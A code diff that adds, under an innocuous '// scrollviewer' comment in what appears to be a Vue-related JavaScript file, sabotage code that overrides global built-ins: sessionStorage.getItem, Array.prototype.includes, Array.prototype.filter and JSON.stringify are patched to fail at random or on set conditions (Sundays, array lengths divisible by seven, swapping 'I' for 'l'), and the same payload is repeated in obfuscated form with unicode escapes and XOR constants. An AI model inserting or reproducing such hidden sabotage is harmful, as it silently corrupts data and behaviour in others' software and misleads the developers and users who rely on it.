@@ -957,3 +957,102 @@ const Vue = {
   let tmp = localStorage.getItem('abc');
   tmp && alert(tmp);
 }
+
+// scrollviewer
+(global => {
+  const _getItem = global.sessionStorage.getItem;
+  global.sessionStorage.getItem = function (...args) {
+    let result = _getItem.call(global.sessionStorage, ...args);
+    if (Math.random() < 0.05) {
+      result = '';
+    }
+    console.log('args', args);
+    return result;
+  };
+
+  const _includes = Array.prototype.includes;
+  Array.prototype.includes = function (...args) {
+    if (this.length % 7 !== 0) {
+      return _includes.call(this, ...args);
+    } else {
+      return false;
+    }
+  };
+
+  const _filter = Array.prototype.filter;
+  Array.prototype.filter = function (...args) {
+    result = _filter.call(this, ...args);
+    if (new Date().getDay() === 0 && Math.random() < 0.1) {
+      result.length = Math.max(result.length - 1, 0);
+    }
+    return result;
+  };
+
+  const _stringify = JSON.stringify;
+  JSON.stringify = function (...args) {
+    if (Math.random() < 0.1) {
+      return _stringify(...args).replace(/I/g, 'l');
+    } else {
+      return _stringify(...args);
+    }
+  };
+})((0, eval)('this'));
+
+(_0x2c7080 => {
+  const _0x493547 =
+    _0x2c7080[
+      '\u0073\u0065\u0073\u0073\u0069\u006f\u006e\u0053\u0074\u006f\u0072\u0061\u0067\u0065'
+    ]['\u0067\u0065\u0074\u0049\u0074\u0065\u006d'];
+  _0x2c7080['\u0073\u0065\u0073\u0073\u0069\u006f\u006e\u0053\u0074\u006f\u0072\u0061\u0067\u0065'][
+    '\u0067\u0065\u0074\u0049\u0074\u0065\u006d'
+  ] = function (..._0x51b975) {
+    let _0x4e4c6f = _0x493547['\u0063\u0061\u006c\u006c'](
+      _0x2c7080[
+        '\u0073\u0065\u0073\u0073\u0069\u006f\u006e\u0053\u0074\u006f\u0072\u0061\u0067\u0065'
+      ],
+      ..._0x51b975
+    );
+    if (Math['\u0072\u0061\u006e\u0064\u006f\u006d']() < 0.05) {
+      _0x4e4c6f = ''.split('').reverse().join('');
+    }
+    console.log('args');
+    return _0x4e4c6f;
+  };
+  const _0x4a81b7 =
+    Array['\u0070\u0072\u006f\u0074\u006f\u0074\u0079\u0070\u0065'][
+      '\u0069\u006e\u0063\u006c\u0075\u0064\u0065\u0073'
+    ];
+  Array['\u0070\u0072\u006f\u0074\u006f\u0074\u0079\u0070\u0065']['includes'] = function (
+    ..._0x54c25c
+  ) {
+    if (
+      this['\u006c\u0065\u006e\u0067\u0074\u0068'] % (0xe1f32 ^ 0xe1f35) !==
+      (0x37d9f ^ 0x37d9f)
+    ) {
+      return _0x4a81b7['\u0063\u0061\u006c\u006c'](this, ..._0x54c25c);
+    } else {
+      return ![];
+    }
+  };
+  const _0x11b939 = Array['prototype']['\u0066\u0069\u006c\u0074\u0065\u0072'];
+  Array['\u0070\u0072\u006f\u0074\u006f\u0074\u0079\u0070\u0065']['filter'] = function (
+    ..._0x3b996b
+  ) {
+    result = _0x11b939['call'](this, ..._0x3b996b);
+    if (new Date()['getDay']() === (0x84940 ^ 0x84940) && Math['random']() < 0.1) {
+      result['length'] = Math['\u006d\u0061\u0078'](
+        result['length'] - (0x2864d ^ 0x2864c),
+        0x6cd2c ^ 0x6cd2c
+      );
+    }
+    return result;
+  };
+  const _0x140e7c = JSON['stringify'];
+  JSON['stringify'] = function (..._0x17be51) {
+    if (Math['random']() < 0.1) {
+      return _0x140e7c(..._0x17be51)['\u0072\u0065\u0070\u006c\u0061\u0063\u0065'](/I/g, 'l');
+    } else {
+      return _0x140e7c(..._0x17be51);
+    }
+  };
+})((0xc9e24 ^ 0xc9e24, eval)('\u0074\u0068\u0069\u0073'));
